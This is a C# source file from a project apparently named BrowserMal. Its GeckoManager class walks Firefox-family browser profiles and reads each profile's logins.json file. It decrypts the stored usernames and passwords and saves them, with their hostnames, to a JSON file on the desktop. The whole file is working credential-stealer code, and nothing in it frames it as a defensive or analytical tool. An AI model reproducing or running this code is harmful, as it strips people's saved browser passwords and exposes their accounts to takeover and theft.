using BrowserMal.Browser;
using BrowserMal.Model;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using GeckoMal;

namespace BrowserMal.Manager
{
    public class GeckoManager<T>
    {
        private readonly string tableName;
        private readonly SqliteTableModel sqliteTableModel;
        private readonly Dictionary<string, string> resultList;

        public GeckoManager(string tableName, SqliteTableModel sqliteTableModel)
        {
            this.tableName = tableName;
            this.sqliteTableModel = sqliteTableModel;
            resultList = new Dictionary<string, string>();
        }

        private List<string> GetAllProfiles(string root) => Directory.GetDirectories(root).ToList();

        public void Init(ref List<BrowserModel> browsers)
        {
            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                List<string> profiles = GetAllProfiles(browser.Location);
                List<CredentialModel> creds = FetchFiles(profiles, browser.Name, browser.ProfileName);

                if (creds.Count == 0)
                    continue;

                Filesaver.FileManager.Save<CredentialModel>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_logins.json");
            }

        }
        //Encryption.GeckoDecryption geckoDecryption;
        private List<CredentialModel> FetchFiles(List<string> profiles, string name, string specificProfile)
        {
            List<CredentialModel> result = new List<CredentialModel>();

            /*foreach (string profile in profiles)
            {
                string loginFile = Path.Combine(profile, "logins.json");

                if (File.Exists(loginFile))
                {
                    if (profile.Contains(specificProfile))
                    {
                        geckoDecryption = new Encryption.GeckoDecryption();
                        geckoDecryption.Init(profile, name);
                        break;
                    }
                }
            }*/

            foreach (string profile in profiles)
            {
                string loginFile = Path.Combine(profile, "logins.json");

                if (File.Exists(loginFile))
                {
                    if (!loginFile.Contains(specificProfile))
                        continue;

                    GeckoMal.Encryption encryption = new GeckoMal.Encryption();
                    encryption.Init(profile, name);
                    /*geckoDecryption = new Encryption.GeckoDecryption();
                    geckoDecryption.Init(profile, name);*/

                    GeckoLogin geckoLogin;

                    using (StreamReader sr = new StreamReader(loginFile))
                    {
                        string json = sr.ReadToEnd();
                        geckoLogin = JsonConvert.DeserializeObject<GeckoLogin>(json);
                    }

                    foreach (GeckoLoginData login in geckoLogin.logins) 
                    {
                        string username = encryption.Decrypt(login.encryptedUsername);
                        string password = encryption.Decrypt(login.encryptedPassword);
                        string hostname = login.hostname;

                        result.Add(new CredentialModel(hostname, username, password));
                    }

                    encryption.Unload();

                    break;
                }
            }

            return result;
        }
    }
}
